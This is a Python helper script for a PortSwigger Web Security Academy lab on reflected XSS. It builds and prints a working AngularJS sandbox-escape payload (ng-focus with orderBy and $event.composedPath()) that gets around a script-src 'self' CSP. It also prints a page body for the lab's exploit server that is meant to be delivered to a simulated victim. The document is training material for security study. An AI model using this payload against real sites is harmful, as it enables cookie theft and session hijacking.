# Lab 28 — Reflected XSS with AngularJS sandbox escape and CSP
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox/lab-angular-sandbox-escape-and-csp
#
# Vulnerability: Search — AngularJS + Content Security Policy (script-src 'self')
# Aim:           Call alert(document.cookie) via exploit server delivery
#
# Technique:
#   CSP header: script-src 'self'
#   Inline <script> tags and raw event handlers are blocked by CSP.
#   But AngularJS is served from 'self' → AngularJS directives ARE allowed
#   (the browser only sees AngularJS doing its normal job).
#
#   ng-focus is an AngularJS directive — not a raw HTML event handler.
#   CSP doesn't block it.
#
#   Payload injected into search:
#     <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
#
#   How it works:
#     - ng-focus fires when the element gets focus
#     - $event.composedPath() → array of DOM elements that triggered the event
#     - |orderBy: passes each element to our expression as the sort function
#     - (z=alert) assigns alert to z (avoids direct window.alert reference)
#     - (document.cookie) calls z with cookie value when window is reached in the array
#     - #x fragment auto-focuses id=x on page load → ng-focus fires immediately
#
#   Cannot be automated — victim delivery requires the exploit server.
#
# Usage: python xss_lab28.py <url>

import sys
import urllib3
from xss_utils import banner, section, print_step, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 28 — REFLECTED XSS: AngularJS + CSP (ng-focus + orderBy)")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab28.py <url>")
        sys.exit(1)

    url = sys.argv[1]

    # URL-encoded payload for the search parameter
    search_payload = "<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>"

    exploit = (
        "<script>\n"
        f"location='{url}/?search=%3Cinput%20id%3Dx%20ng-focus%3D%24event.composedPath()"
        "%7CorderBy%3A%27(z%3Dalert)(document.cookie)%27%3E#x';\n"
        "</script>"
    )

    print("  ℹ  CSP (script-src 'self') blocks inline scripts and raw event handlers.")
    print("     AngularJS ng-focus is a directive — CSP allows it (AngularJS is from 'self').\n")
    print(f"  ➜  Payload injected into search:\n     {search_payload}\n")

    print_box("EXPLOIT SERVER BODY — paste this into the Body field", exploit)

    print_step("Go to the exploit server")
    print_step("Paste the script above into the Body field (update YOUR-LAB-ID)")
    print_step("Click 'Store', then 'Deliver exploit to victim'")
    print()
    print("  ℹ  orderBy filter reaches window via composedPath array.")
    print("     (z=alert) avoids direct window.alert reference → bypasses sandbox check.")
    print("     #x auto-focuses → ng-focus fires immediately, no interaction needed.")
